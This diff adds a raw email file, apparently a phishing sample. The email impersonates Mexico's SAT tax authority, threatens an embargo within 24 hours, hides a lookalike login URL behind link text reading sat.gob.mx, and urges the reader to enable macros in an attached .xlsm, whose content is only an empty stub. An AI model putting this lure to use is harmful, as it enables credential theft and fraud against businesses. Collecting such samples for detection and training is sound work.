@@ -1,0 +1,31 @@
+From: Servicio de Administracion Tributaria <notificaciones@sat-tramites.xyz>
+To: finanzas@quimicaboss.com.mx
+Subject: URGENTE: Notificación de Embargo Precautorio por Inconsistencias Fiscales
+Date: Mon, 21 Sep 2026 10:15:00 -0600
+Message-ID: <sat-alert-20260921-01@sat-tramites.xyz>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="====BOUNDARY_SAT_01===="
+
+--====BOUNDARY_SAT_01====
+Content-Type: text/html; charset="utf-8"
+
+<!DOCTYPE html>
+<html>
+<body>
+<h2>SERVICIO DE ADMINISTRACIÓN TRIBUTARIA (SAT)</h2>
+<p>Estimado contribuyente de Química Boss S.A. de C.V.,</p>
+<p>Se le notifica que cuenta con un <strong>crédito fiscal pendiente y resolución de embargo</strong> en un plazo improrrogable de 24 horas.</p>
+<p>Para solventar esta situación y evitar la suspensión inmediata de sellos digitales, ingrese al portal oficial:</p>
+<p><a href="http://portal-sat-seguridad.xyz/login?usuario=finanzas@quimicaboss.com.mx">https://sat.gob.mx/buzon-tributario/acceso</a></p>
+<p>Descargue el requerimiento oficial adjunto y active las macros para validar su firma electrónica.</p>
+</body>
+</html>
+
+--====BOUNDARY_SAT_01====
+Content-Type: application/vnd.ms-excel.sheet.macroEnabled.12; name="Requerimiento_Fiscal_SAT.xlsm"
+Content-Disposition: attachment; filename="Requerimiento_Fiscal_SAT.xlsm"
+Content-Transfer-Encoding: base64
+
+UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAA=
+
+--====BOUNDARY_SAT_01====--
